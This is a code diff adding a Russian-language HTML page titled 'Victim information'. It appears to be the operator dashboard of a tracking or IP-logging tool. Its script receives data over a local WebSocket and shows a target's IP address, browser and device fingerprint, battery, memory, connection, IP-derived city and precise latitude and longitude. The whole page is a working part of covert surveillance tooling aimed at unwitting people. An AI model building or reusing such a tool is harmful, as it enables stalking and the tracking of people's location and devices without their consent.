@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Информация о жертве</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .info { margin: 20px; }
+        .info p { margin: 5px 0; }
+    </style>
+</head>
+<body>
+    <h1>Информация о жертве</h1>
+    <div class="info" id="info">
+        <p>IP-адрес: <span id="ip"></span></p>
+        <p>User Agent: <span id="userAgent"></span></p>
+        <p>Разрешение экрана: <span id="screenResolution"></span></p>
+        <p>Часовой пояс: <span id="timezone"></span></p>
+        <p>Язык: <span id="language"></span></p>
+        <p>Плагины: <span id="plugins"></span></p>
+        <p>Операционная система: <span id="os"></span></p>
+        <p>Cookies включены: <span id="cookiesEnabled"></span></p>
+        <p>Do Not Track: <span id="doNotTrack"></span></p>
+        <p>Количество ядер процессора: <span id="hardwareConcurrency"></span></p>
+        <p>Уровень заряда батареи: <span id="battery"></span></p>
+        <p>Тип соединения: <span id="connection"></span></p>
+        <p>Оперативная память: <span id="memory"></span></p>
+        <p>Точное местоположение: <span id="preciseLocation"></span></p>
+        <p>Местоположение по IP: <span id="location"></span></p>
+    </div>
+    <script>
+        const ws = new WebSocket('ws://localhost:3000');
+
+        ws.onmessage = event => {
+            const data = JSON.parse(event.data);
+            document.getElementById('ip').textContent = data.ip;
+            document.getElementById('userAgent').textContent = data.userAgent;
+            document.getElementById('screenResolution').textContent = data.screenResolution;
+            document.getElementById('timezone').textContent = data.timezone;
+            document.getElementById('language').textContent = data.language;
+            document.getElementById('plugins').textContent = data.plugins.join(', ');
+            document.getElementById('os').textContent = data.os;
+            document.getElementById('cookiesEnabled').textContent = data.cookiesEnabled;
+            document.getElementById('doNotTrack').textContent = data.doNotTrack;
+            document.getElementById('hardwareConcurrency').textContent = data.hardwareConcurrency;
+            document.getElementById('battery').textContent = data.battery ? `${data.battery * 100}%` : 'Не доступно';
+            document.getElementById('connection').textContent = data.connection || 'Не определено';
+            document.getElementById('memory').textContent = data.memory ? `${data.memory / (1024 * 1024)} MB` : 'Не доступно';
+            if (data.preciseLocation) {
+                document.getElementById('preciseLocation').textContent = `Широта: ${data.preciseLocation.latitude}, Долгота: ${data.preciseLocation.longitude}`;
+            } else {
+                document.getElementById('preciseLocation').textContent = 'Не доступно';
+            }
+            document.getElementById('location').textContent = `${data.location.city}, ${data.location.region_code}, ${data.location.country_name}`;
+        };
+    </script>
+</body>
+</html>
